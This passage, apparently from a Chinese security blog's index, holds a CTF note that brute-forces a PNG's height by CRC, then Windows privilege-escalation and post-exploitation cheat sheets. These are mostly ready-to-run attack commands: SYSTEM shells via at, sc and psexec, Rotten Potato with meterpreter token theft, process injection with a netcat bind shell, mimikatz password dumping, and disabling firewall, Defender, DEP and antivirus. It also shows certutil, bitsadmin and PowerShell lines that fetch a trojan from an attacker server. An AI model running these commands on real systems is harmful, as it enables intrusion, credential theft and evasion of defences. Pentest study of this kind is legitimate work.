class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定原来的chunk[0]非校验码部分（17字节）</span></span><br><span class="line"><span class="comment">#x49x48x44x52x00x00x01xF4x00x00x01xA4x08x06x00x00x00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#crc32key存放chunk[0]的校验码</span></span><br><span class="line">crc32key = <span class="number">0xCBD6DF8A</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#碰撞</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">65535</span>):</span><br><span class="line">  height = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)</span><br><span class="line">  <span class="comment">#CRC: CBD6DF8A</span></span><br><span class="line">  data = <span class="string">&#x27;x49x48x44x52x00x00x01xF4&#x27;</span> + height + <span class="string">&#x27;x08x06x00x00x00&#x27;</span></span><br><span class="line"> </span><br><span class="line">  crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果该高度生成的crc校验码和chuank[0]的crc匹配，那么说明这就是原图片高度</span></span><br><span class="line">  <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> c: <span class="string">&quot;%02X&quot;</span> % <span class="built_in">ord</span>(c), height))</span><br></pre></td></tr></table></figure><h2 id="拓展，其他使用了CRC校验的文件"><a href="#拓展，其他使用了CRC校验的文件" class="headerlink" title="拓展，其他使用了CRC校验的文件"></a>拓展，其他使用了CRC校验的文件</h2><p>除了 PNG 文件之外，一些其他文件格式也使用 CRC 校验码来确保数据的完整性。以下是一些可能包含 CRC 校验码的文件格式的示例：</p><ol><li><strong>ZIP 文件 (.zip)：</strong> 压缩文件格式，其中包含的每个文件都可以带有 CRC 校验码，用于确保文件在解压缩时的完整性。</li><li><strong>GZIP 文件 (.gz)：</strong> 一种用于压缩单个文件的格式，通常包含 CRC32 校验码。</li><li><strong>TAR 文件 (.tar)：</strong> 一种文件存档格式，可以包含多个文件，通常与其他压缩格式（如 gzip）结合使用。CRC 校验码有时会用于确保整个存档的完整性。</li><li><strong>Ethernet 帧：</strong> 在计算机网络中，以太网帧通常包含一个帧检验序列（FCS），它是 CRC32 的一部分，用于检测在网络传输中是否发生了错误。</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 隐写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows提权</title>
      <link href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows%E6%8F%90%E6%9D%83/"/>
      <url>/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><p>参考原文链接：<a href="https://zhuanlan.zhihu.com/p/394060852">https://zhuanlan.zhihu.com/p/394060852</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="常规信息收集"><a href="#常规信息收集" class="headerlink" title="常规信息收集"></a>常规信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">systeminfo #查询系统信息</span><br><span class="line">hostname #主机名</span><br><span class="line">net user #查看用户信息</span><br><span class="line">netstat -and|find &quot;3389&quot; # 查看服务pid号</span><br><span class="line">wmic os get caption #查看系统名</span><br><span class="line">wmic qfe get Description,HotFixID,InstalledOn134 #查看补丁信息</span><br><span class="line">wmic product get name,version #查看当前安装程序</span><br><span class="line">wmic service list brief #查询本机进程</span><br><span class="line">net share #查看本机共享列表</span><br><span class="line">netsh firewall show config #查看防火墙配置</span><br></pre></td></tr></table></figure><h3 id="常见的杀软如下"><a href="#常见的杀软如下" class="headerlink" title="常见的杀软如下"></a>常见的杀软如下</h3><blockquote><ul><li>360sd.exe 360杀毒</li><li>360tray.exe 360实时防护</li><li>ZhuDongFangYu.exe 360主动防御</li><li>KSafeTray.exe 金山卫士</li><li>SafeDogUpdateCenter.exe 安全狗</li><li>McAfee McShield.exe McAfee</li><li>egui.exe NOD32</li><li>AVP.exe 卡巴斯基</li><li>avguard.exe 小红伞</li><li>bdagent.exe BitDefender</li></ul></blockquote><h3 id="一般需要收集的信息"><a href="#一般需要收集的信息" class="headerlink" title="一般需要收集的信息"></a>一般需要收集的信息</h3><blockquote><ul><li>机器的系统及其版本</li><li>机器的打补丁情况</li><li>机器安装的服务</li><li>机器的防火墙策略配置</li><li>机器的防护软件情况</li></ul></blockquote><h2 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h2><h3 id="提权定义"><a href="#提权定义" class="headerlink" title="提权定义"></a>提权定义</h3><p>提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。</p><h3 id="常用的提权方法"><a href="#常用的提权方法" class="headerlink" title="常用的提权方法"></a>常用的提权方法</h3><p>Windows常用的提权方法系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件/服务提权等</p><h2 id="几种本地提权方法"><a href="#几种本地提权方法" class="headerlink" title="几种本地提权方法"></a>几种本地提权方法</h2><h3 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a>系统内核溢出漏洞提权</h3><h4 id="手工查找补丁情况"><a href="#手工查找补丁情况" class="headerlink" title="手工查找补丁情况"></a>手工查找补丁情况</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo  #查看补丁</span><br><span class="line">wmic qfe get Description,HotFixID,InstalledOn  #查看补丁信息</span><br></pre></td></tr></table></figure><h4 id="msf后渗透扫描"><a href="#msf后渗透扫描" class="headerlink" title="msf后渗透扫描"></a>msf后渗透扫描</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure><h4 id="利用（Vulmap、Wes、WindowsVulnScan）对比补丁进而进行提权"><a href="#利用（Vulmap、Wes、WindowsVulnScan）对比补丁进而进行提权" class="headerlink" title="利用（Vulmap、Wes、WindowsVulnScan）对比补丁进而进行提权"></a>利用（Vulmap、Wes、WindowsVulnScan）对比补丁进而进行提权</h4><h3 id="at定时任务命令利用"><a href="#at定时任务命令利用" class="headerlink" title="at定时任务命令利用"></a>at定时任务命令利用</h3><p><strong>在Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以使用at命令将权限提升至system权限。</strong></p><blockquote><p>AT命令是Windows XP中内置的命令，它也可以媲美Windows中的“计划任务”，而且在计划的安排、任务的管理、工作事务的处理方面，AT命令具有更强大更神通的功能。AT命令可在指定时间和日期、在指定计算机上运行命令和程序。</p></blockquote><p>因为at命令默认是以system权限下运行的所以我们可以利用以下命令，进行提权。</p><h4 id="有GUI条件下（远程桌面连接的情况）"><a href="#有GUI条件下（远程桌面连接的情况）" class="headerlink" title="有GUI条件下（远程桌面连接的情况）"></a>有GUI条件下（远程桌面连接的情况）</h4><p>at 时间 /interactive cmd 其中里面的/interactive参数是开启交互模式</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">at</span> <span class="number">14</span>:<span class="number">40</span> /interactive <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure><p>几分钟后，启动了一个system权限的cmd</p><p>注：如果想要桌面也是使用system权限，就需要再添加一个system权限开启的桌面进程</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskmgr.exe</span><br></pre></td></tr></table></figure><p>最后在任务管理器里结束掉之前账号开启的桌面进程</p><h4 id="无GUI条件下"><a href="#无GUI条件下" class="headerlink" title="无GUI条件下"></a>无GUI条件下</h4><p>可以将时间后面的路径更改为上传的提权木马。</p><h3 id="sc命令提权"><a href="#sc命令提权" class="headerlink" title="sc命令提权"></a>sc命令提权</h3><p><strong>SC</strong>命令介绍</p><blockquote><p> sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务，通俗理解就是 SC 可以启动一个服务。</p></blockquote><p>适用版本：windows/ 7、8、2003、2008、2012、2016</p><p>前提：已获取本地用户权限，图形化界面</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>执行命令创建一个名叫syscmd的交互式cmd执行服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= &quot;<span class="built_in">cmd</span> /K <span class="built_in">start</span>&quot; <span class="built_in">type</span>= own <span class="built_in">type</span>= interact </span><br></pre></td></tr></table></figure><p>执行命令，启动syscmd服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc <span class="built_in">start</span> syscmd</span><br></pre></td></tr></table></figure><h4 id="实战中还可以将binPath-”cmd-K-start”-更换为binPath-”上传的木马路径”-运行木马文件来获取system权限。"><a href="#实战中还可以将binPath-”cmd-K-start”-更换为binPath-”上传的木马路径”-运行木马文件来获取system权限。" class="headerlink" title="实战中还可以将binPath=”cmd /K start” 更换为binPath=”上传的木马路径” 运行木马文件来获取system权限。"></a>实战中还可以将binPath=”cmd /K start” 更换为binPath=”上传的木马路径” 运行木马文件来获取system权限。</h4><h3 id="PS命令提权"><a href="#PS命令提权" class="headerlink" title="PS命令提权"></a><strong>PS命令提权</strong></h3><p> 适用于Windows/2003、2008、2012、2016</p><p>微软官方系统调试工具包： <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools - Sysinternals | Microsoft Learn</a></p><p>执行命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula -s -i -d <span class="built_in">cmd</span>   #调用运行<span class="built_in">cmd</span></span><br></pre></td></tr></table></figure><h3 id="烂土豆提权"><a href="#烂土豆提权" class="headerlink" title="烂土豆提权"></a>烂土豆提权</h3><h4 id="注意（重点：用烂土豆配合本地用户提权是成功不了的，必须是web权限或数据库权限"><a href="#注意（重点：用烂土豆配合本地用户提权是成功不了的，必须是web权限或数据库权限" class="headerlink" title="注意（重点：用烂土豆配合本地用户提权是成功不了的，必须是web权限或数据库权限"></a><strong>注意（重点：用烂土豆配合本地用户提权是成功不了的，必须是web权限或数据库权限</strong></h4><p>烂土豆提权<br>2.如果权限不够(如：只有web shell权限) 无法获取system令牌，可以配合烂土豆漏洞获取。</p><p>烂土豆下载：<a href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a></p><p>程序路径：Potato/source/Potato/Potato/bin/Release/Potato.exe</p><p>生成一个MSF木马上传让其上线，并连接，再在目标系统上传烂土豆程序：potato.exe。在反弹回来的shell界面执行命令。</p><h4 id="执行命令："><a href="#执行命令：" class="headerlink" title="执行命令："></a>执行命令：</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">execute -cH -f ./potato.exe   #执行烂土豆程序</span><br><span class="line"></span><br><span class="line">use incognito   #加载窃取模块</span><br><span class="line"></span><br><span class="line">list_tokens -u   #查看可窃取的令牌</span><br><span class="line"></span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;   #窃取令牌</span><br></pre></td></tr></table></figure><h3 id="进程迁移提权"><a href="#进程迁移提权" class="headerlink" title="进程迁移提权"></a>进程迁移提权</h3><p>前提条件：需要存在system权限的进程，就可以使用迁移。没有就是当前权限不够</p><blockquote><p> 进程迁移注入提权就是将获取到权限低的进程注入至进程中权限高的中，这样就实现了权限提升，同时注入进程提权相当于开启了一个后门， 隐蔽性极高，不会创建新的进程，很难发现。</p></blockquote><p>pinjector工具注入<br>提权测试：Win 2003  pinjector工具貌似只适用于2003版本。</p><p>前提：已获取本地用户权限</p><p>1.pinjector工具实现进程注入，需要先下载工具，然后将工具上传需要提权的系统中即可。</p><p>下载：<a href="http://www.tarasco.org/security/Process_Injector/">http://www.tarasco.org/security/Process_Injector/</a></p><p>2.将工具上传之后，执行命令查看所有进程的权限</p><p>  执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pinjector.exe -l    #列取所有进程</span><br></pre></td></tr></table></figure><p>3.选择一个system权限的进程pid编号，使用命令将权限绑定到进程中</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pinjector.exe -p &lt;pid&gt; <span class="built_in">cmd</span> &lt;port&gt;  #选择一个system权限运行的进程，对此pid进程执行注入，并建立侦听端口</span><br></pre></td></tr></table></figure><p>4.攻击机使用nc命令连接进程</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 目标ip 端口</span><br></pre></td></tr></table></figure><h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><p><strong>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的</strong></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h4><blockquote><p>这里假设有一个服务路径</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Common</span> <span class="title">Files</span>\<span class="title">Tencent</span>\<span class="title">QQMusic</span>\<span class="title">QQMusicService.exe</span></span></span><br></pre></td></tr></table></figure><p>带引号时：”C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe”会被看成一个完整的服务路径，故不会产生漏洞。</p><p>不带引号时：我们认为的服务路径是C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe，但是由于没有双引号的包裹，Windows会认为C:\Program空格后面的为Progr</p></blockquote><h4 id="寻找存在漏洞的服务"><a href="#寻找存在漏洞的服务" class="headerlink" title="寻找存在漏洞的服务"></a>寻找存在漏洞的服务</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | <span class="built_in">findstr</span> /i &quot;Auto&quot; | <span class="built_in">findstr</span> /i /v &quot;C:\Windows\\&quot; | <span class="built_in">findstr</span> /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic1.zhimg.com/v2-1b0bfdbb7268eb970124cc4c74c8ada0_r.jpg" alt="img"></p><p>再把后门文件放在对应的文件路径下</p><p><img src="https://pic1.zhimg.com/v2-c83cbe8be48c5e332ebae3ff11338e58_r.jpg" alt="img"></p><p>在msf上开启监听，然后启动对应服务</p><p><img src="https://pic1.zhimg.com/v2-c83cbe8be48c5e332ebae3ff11338e58_r.jpg" alt="img"></p><p>接收到shell，而且是system权限</p><p><img src="https://pic4.zhimg.com/v2-8c205274f80afcf5f0b7d83e86e38463_r.jpg" alt="img"></p><h2 id="仍在收集更新"><a href="#仍在收集更新" class="headerlink" title="仍在收集更新"></a>仍在收集更新</h2>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>widows命令行开启管理员权限</title>
      <link href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90/"/>
      <url>/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<h2 id="开启禁用的管理员账号"><a href="#开启禁用的管理员账号" class="headerlink" title="开启禁用的管理员账号"></a>开启禁用的管理员账号</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user administrator /active:yes</span><br></pre></td></tr></table></figure><p>(可以输入 net user /? 来查看命令的使用方法)</p><h2 id="使用管理员权限运行程序"><a href="#使用管理员权限运行程序" class="headerlink" title="使用管理员权限运行程序"></a>使用管理员权限运行程序</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /user:administrator <span class="built_in">cmd</span> #这里跟的是命令</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows后渗透</title>
      <link href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows%E5%90%8E%E6%B8%97%E9%80%8F/"/>
      <url>/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows%E5%90%8E%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="windows后渗透"><a href="#windows后渗透" class="headerlink" title="windows后渗透"></a>windows后渗透</h1><h2 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regedit</span><br></pre></td></tr></table></figure><h3 id="reg常用命令"><a href="#reg常用命令" class="headerlink" title="reg常用命令"></a>reg常用命令</h3><h4 id="增加"><a href="#增加" class="headerlink" title="增加"></a>增加</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add hkcu\charles /v hello /t REG_SZ /d &quot;welcome to lgch_xyz&quot;</span><br></pre></td></tr></table></figure><blockquote><p>HKCU：根键 HKEY_CURRENT_USER的缩写<br>另外几个缩写：HKCR、HKLM、HKU、HKCC，取根键的<br>/v：需要创建的值的名称<br>/t：值的类型<br>/d：值的数据</p><p>此命令的执行结果：</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231110164922635.png" alt="image-20231110164922635"></p></blockquote><h4 id="注册表上的“默认”值如何修改"><a href="#注册表上的“默认”值如何修改" class="headerlink" title="注册表上的“默认”值如何修改"></a>注册表上的“默认”值如何修改</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add hkcu\charles /ve /t REG_DWORD /d <span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>默认值的名称默认写作“/ve”</p><p>ve = value empty</p></blockquote><h3 id="导入导出删除"><a href="#导入导出删除" class="headerlink" title="导入导出删除"></a>导入导出删除</h3><p>导出hkcu\charles这个键到桌面下命名为charles.reg</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg export hkcu\charles c:\Users\lkk-win7\Desktop\charles.reg</span><br></pre></td></tr></table></figure><p>删除<code>hkcu</code>键，稍后用导出的注册表恢复文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg delete hkcu\charles /f</span><br></pre></td></tr></table></figure><p>此时查看这个键会报错</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query hkcu\charles</span><br></pre></td></tr></table></figure><p>导入</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg import c:\charles.reg</span><br></pre></td></tr></table></figure><p>删除hkcu\charles下创建的“hello”值</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg delete hkcu\charles /v hello /f</span><br></pre></td></tr></table></figure><h2 id="msf抓取密码"><a href="#msf抓取密码" class="headerlink" title="msf抓取密码"></a>msf抓取密码</h2><blockquote><ol><li>get uid查看以下用户名和权限</li></ol>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure><ol start="2"><li>查看密码</li></ol>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">kiwi_cmd sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure></blockquote><h2 id="关闭一系列操作"><a href="#关闭一系列操作" class="headerlink" title="关闭一系列操作"></a>关闭一系列操作</h2><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><blockquote><p>管理员及以上权限</p></blockquote><h3 id="关闭denfender"><a href="#关闭denfender" class="headerlink" title="关闭denfender"></a>关闭denfender</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> stop windefend</span><br></pre></td></tr></table></figure><h3 id="关闭DEP"><a href="#关闭DEP" class="headerlink" title="关闭DEP"></a>关闭DEP</h3><blockquote><p>数据执行防护</p><ul><li><p>数据执行防护 (DEP) 是 Windows 中内置的一项技术，可帮助保护你免受从不应启动的位置启动的可执行代码的损害。 DEP 通过将电脑内存的某些区域标记为仅用于数据，将不允许任何可执行代码或应用从这些内存区域运行，</p><p>  这旨在使尝试使用缓冲区溢出或其他技术的攻击更难从通常仅包含数据的内存部分运行其恶意软件。</p></li></ul></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit.exe /<span class="built_in">set</span> &#123;current&#125; nx AlwaysOff</span><br></pre></td></tr></table></figure><h3 id="关闭杀毒软件（msf用）"><a href="#关闭杀毒软件（msf用）" class="headerlink" title="关闭杀毒软件（msf用）"></a>关闭杀毒软件（msf用）</h3><p>meterpreter 命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br></pre></td></tr></table></figure><h2 id="上传下载文件"><a href="#上传下载文件" class="headerlink" title="上传下载文件"></a>上传下载文件</h2><p>例：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">19</span>/muma.exe&quot; C:\Users\lkk-win7\file.exe</span><br></pre></td></tr></table></figure><h3 id="使用bitsadmin-下载"><a href="#使用bitsadmin-下载" class="headerlink" title="使用bitsadmin 下载"></a>使用bitsadmin 下载</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer myjob /download /priority normal http://your-attacker-server/file.exe C:\destination\file.exe</span><br></pre></td></tr></table></figure><h3 id="使用cmd的certutil下载-最好用"><a href="#使用cmd的certutil下载-最好用" class="headerlink" title="使用cmd的certutil下载(最好用)"></a>使用cmd的certutil下载(最好用)</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f &quot;http://your-attacker-server/file.exe&quot; C:\destination\file.exe</span><br></pre></td></tr></table></figure><h3 id="使用powershell-的invoke命令下载"><a href="#使用powershell-的invoke命令下载" class="headerlink" title="使用powershell 的invoke命令下载"></a>使用powershell 的invoke命令下载</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri &quot;http://your-attacker-server/file.exe&quot; -OutFile &quot;C:\destination\file.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="查看开放服务"><a href="#查看开放服务" class="headerlink" title="查看开放服务"></a>查看开放服务</h2><h3 id="直接查看"><a href="#直接查看" class="headerlink" title="直接查看"></a>直接查看</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">start</span></span><br></pre></td></tr></table></figure><h3 id="常规信息收集"><a href="#常规信息收集" class="headerlink" title="常规信息收集"></a>常规信息收集</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">systeminfo #查询系统信息</span><br><span class="line">hostname #主机名</span><br><span class="line"><span class="built_in">net</span> user #查看用户信息</span><br><span class="line">netstat -and|<span class="built_in">find</span> &quot;<span class="number">3389</span>&quot; # 查看服务pid号</span><br><span class="line">wmic os get caption #查看系统名</span><br><span class="line">wmic qfe get Description,HotFixID,InstalledOn134 #查看补丁信息</span><br><span class="line">wmic product get name,version #查看当前安装程序</span><br><span class="line">wmic service list brief #查询本机进程</span><br><span class="line"><span class="built_in">net</span> share #查看本机共享列表</span><br><span class="line">netsh firewall show config #查看防火墙配置</span><br></pre></td></tr></table></figure><h3 id="通过查看端口推测打开的服务"><a href="#通过查看端口推测打开的服务" class="headerlink" title="通过查看端口推测打开的服务"></a>通过查看端口推测打开的服务</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><h2 id="关闭杀软（不借助工具）"><a href="#关闭杀软（不借助工具）" class="headerlink" title="关闭杀软（不借助工具）"></a>关闭杀软（不借助工具）</h2><h3 id="软件在注册表的主要位置："><a href="#软件在注册表的主要位置：" class="headerlink" title="软件在注册表的主要位置："></a>软件在注册表的主要位置：</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE</span><br></pre></td></tr></table></figure><h3 id="通过修改注册表来关闭windows-defender"><a href="#通过修改注册表来关闭windows-defender" class="headerlink" title="通过修改注册表来关闭windows defender"></a>通过修改注册表来关闭windows defender</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /d <span class="number">1</span> /t REG_DWORD</span><br></pre></td></tr></table></figure><h3 id="一些收集到的方法："><a href="#一些收集到的方法：" class="headerlink" title="一些收集到的方法："></a>一些收集到的方法：</h3><p>原文链接：<a href="https://zhidao.baidu.com/question/16197635.html">https://zhidao.baidu.com/question/16197635.html</a></p><blockquote><p>原文链接：<a href="https://blog.csdn.net/xiazhijiang520/article/details/3437786">https://blog.csdn.net/xiazhijiang520/article/details/3437786</a></p><p>Ø 在命令行下请用ntsd –c -q -p PID或者使用c:/pskill.exe ravmon命令来杀掉瑞星软件 </p><p>Ø 关于诺顿企业版“文件自动防护“的关闭方法： </p><p>1）关闭服务：net stop “Symantec AntiVirus” 关闭成功！ </p><p>2)关闭进程：Rtvscan，CCAPP，vptray，defwatch，等等所有诺顿进程全部关闭成功！试运行木马，被删除，证明诺顿“文件自动防护”功能仍在运行！ </p><p>Ø 关闭webguard主页防修改软件的方法： </p><p>c:/pskill.exe syncserver </p><p>net stop fmdaemon </p><p>Ø 关闭金山杀毒： </p><p>net stop KAVStart或直接c:/pskill kavstart / KWatch </p><p>关闭天网防火墙： </p><p>c:/pskill.exe pfw </p><p>Ø 关闭macfee软件: </p><p>Ø 如何关闭卡巴 </p><p>把时间调到2038之后.卡巴出现错误.自动关闭! </p><p>Ø 关闭blackice防火墙 </p><p>将时间调到2099年，发现blackice服务停止</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
